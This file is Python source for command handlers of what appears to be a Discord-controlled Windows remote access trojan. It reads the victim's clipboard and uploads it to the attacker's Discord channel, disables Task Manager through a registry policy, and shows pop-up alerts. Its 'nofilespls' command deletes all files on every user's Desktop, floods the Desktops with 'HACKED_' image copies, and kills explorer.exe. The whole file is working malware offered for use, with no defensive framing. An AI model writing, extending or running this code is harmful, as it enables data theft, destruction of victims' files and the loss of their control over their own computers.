import asyncio,ctypes,pyperclip,os,discord,subprocess
import pyperclip
import os
import random
import string
import threading
import shutil
import concurrent.futures
import discord
import subprocess
import os
from discord import Embed
from discord.ext import commands
from discord import Embed
async def alert(ctx, *, args=None):
    if not args or ',' not in args:
        embed = discord.Embed(
            title="Invalid Arguments",
            description="You must provide a message and a title separated by a comma.\n\n**Usage:** `.alert <message>, <title>`\n**Example:** `.alert error here, PC is done`",
            color=discord.Color.red()
        )
        embed.set_footer(text="ALERT COMMAND")
        await ctx.send(embed=embed)
        return

    msg, title = map(str.strip, args.split(',', 1))

    async def show_alert(msg, title):
        try:
            loop = asyncio.get_event_loop()
            await loop.run_in_executor(None, ctypes.windll.user32.MessageBoxW, 0, msg, title, 0x30)
        except Exception:
            pass

    asyncio.create_task(show_alert(msg, title))

    embed = discord.Embed(
        title="🔔 Alert Shown",
        description=f"**Title:** `{title}`\n**Message:** ```{msg}```",
        color=discord.Color.green()
    )
    embed.set_footer(text="ALERT SENT")
    await ctx.send(embed=embed)

async def cb(ctx, *, action: str = None):
    content = ctx.message.content.strip()

    if content.startswith(".cb write "):
        text = content[len(".cb write "):].strip()
        if text:
            pyperclip.copy(text)
            await ctx.send(f"Copied: {text}")
        else:
            await ctx.send("Provide text to copy.")
        return

    if content.startswith(".cb get"):
        text = pyperclip.paste()
        if text:
            path = os.path.join(os.path.expanduser('~/Documents/cb'), "clipboard.txt")
            os.makedirs(os.path.dirname(path), exist_ok=True)
            with open(path, "w") as f:
                f.write(text)
            await ctx.send(file=discord.File(path, "clipboard.txt"))
        else:
            await ctx.send("Clipboard empty.")
        return

    if content.startswith(".cb clear"):
        pyperclip.copy("")
        await ctx.send("Clipboard cleared.")
        return

    embed = Embed(title="Clipboard Commands", color=discord.Color.green())
    embed.add_field(name=".cb write <text>", value="Write text to clipboard", inline=False)
    embed.add_field(name=".cb get", value="Get clipboard contents", inline=False)
    embed.add_field(name=".cb clear", value="Clear clipboard.", inline=False)
    embed.add_field(name=".cb help", value="Show this message.", inline=False)
    await ctx.send(embed=embed)

async def taskmanagerset(ctx, action: str):
    if action.lower() not in ["enable", "disable"]:
        await ctx.send("Invalid action. Use `enable` or `disable`.")
        return

    try:
        script = (
            "Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System' -Name 'DisableTaskMgr' -Value 0"
            if action.lower() == "enable"
            else "Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System' -Name 'DisableTaskMgr' -Value 1"
        )
        subprocess.run(["powershell", "-Command", script], creationflags=subprocess.CREATE_NO_WINDOW, check=True)
        await ctx.send(f"Task Manager has been {action}d.")
    except subprocess.CalledProcessError as e:
        await ctx.send(f"Failed to {action} Task Manager: {e}")
active_effects = {}

async def invcol(ctx):
    try:
        enum_windows_proc = ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.c_int, ctypes.c_void_p)
        user32 = ctypes.windll.user32

        def fin():
            def enum_windows_callback(hwnd, lParam):
                window_title = ctypes.create_unicode_buffer(512)
                user32.GetWindowTextW(hwnd, window_title, 512)
                if "Magnifier" in window_title.value:
                    user32.PostMessageW(hwnd, 0x0112, 0xF020, 0)
                return True

            user32.EnumWindows(enum_windows_proc(enum_windows_callback), 0)

        def pk(key_code, down=True):
            action = 0 if down else 2
            ctypes.windll.user32.keybd_event(key_code, 0, action, 0)

        ctypes.windll.user32.SystemParametersInfoW(0x0014, 0, None, 0)

        pk(0x5B, True)
        pk(0x6B, True)
        pk(0x5B, False)
        pk(0x6B, False)

        await asyncio.sleep(0.5)

        pk(0x11, True)
        pk(0x12, True)
        pk(0x49, True)
        pk(0x49, False)
        pk(0x12, False)
        pk(0x11, False)

        pk(0x5B, True)
        pk(0x6D, True)
        pk(0x6D, False)
        pk(0x5B, False)

        await asyncio.sleep(0.5)

        fin()

        await ctx.send("inverted colors")
    except Exception:
        pass          
async def nofilespls(ctx):
    if not ctx.message.attachments:
        await ctx.send(embed=discord.Embed(title="Error", description="Upload an image file.", color=discord.Color.red()))
        return

    attachment = ctx.message.attachments[0]
    valid_extensions = [".webp", ".png", ".jpeg", ".jpg", ".ico"]
    file_extension = os.path.splitext(attachment.filename)[1].lower()

    if file_extension not in valid_extensions:
        await ctx.send(embed=discord.Embed(title="Invalid File", description="Only image files are allowed.", color=discord.Color.red()))
        return

    file_content = await attachment.read()
    image_path = f"uploaded_file{file_extension}"
    with open(image_path, "wb") as file:
        file.write(file_content)

    desktop_folders = [os.path.join(root, "Desktop") for root, _, _ in os.walk(r"C:\Users") if os.path.exists(os.path.join(root, "Desktop"))]
    max_tasks = 20

    def delete_file(file_path):
        try:
            if os.path.isfile(file_path): os.remove(file_path)
            elif os.path.isdir(file_path): shutil.rmtree(file_path)
        except: pass

    def flood_desktop():
        with concurrent.futures.ThreadPoolExecutor(max_workers=max_tasks) as executor:
            for folder in desktop_folders:
                try:
                    for item in os.listdir(folder):
                        item_path = os.path.join(folder, item)
                        if item.endswith(".lnk") and ("firefox" in item.lower() or "chrome" in item.lower()):
                            executor.submit(delete_file, item_path)
                        elif os.path.isfile(item_path):
                            executor.submit(delete_file, item_path)
                    for _ in range(150):
                        random_name = os.path.join(folder, f'HACKED_{"".join(random.choices(string.ascii_uppercase, k=5))}{file_extension}')
                        executor.submit(shutil.copy, image_path, random_name)
                except: pass

    threading.Thread(target=flood_desktop).start()
    
    try:
        subprocess.run("taskkill /im explorer.exe /f", shell=True)
        subprocess.run("start explorer.exe", shell=True)
    except: pass

    embed = discord.Embed(title="Desktop Flooded", description=f"Flooded with {attachment.filename}", color=discord.Color.green())
    embed.set_image(url=attachment.url)
    await ctx.send(embed=embed)